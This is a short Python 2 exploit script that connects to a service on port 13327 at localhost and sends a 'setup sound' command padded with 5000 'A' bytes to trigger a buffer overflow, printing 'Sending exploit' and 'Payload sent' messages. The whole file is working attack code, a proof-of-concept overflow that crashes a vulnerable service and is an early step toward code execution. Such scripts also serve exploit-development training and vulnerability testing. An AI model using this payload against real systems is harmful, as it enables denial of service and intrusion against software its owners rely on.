#!/usr/bin/python
import socket, sys

host = "127.0.0.1"
offset = 5000

overflow = "\x41" * offset
buffer = "\x11(setup sound " + overflow + "\x90\x00#"

s = socket.socket()

print "[*] Sending exploit..."
s.connect((host, 13327))
data = s.recv(1024)
print data
s.send(buffer)
s.close()

print "[!] Payload sent!"
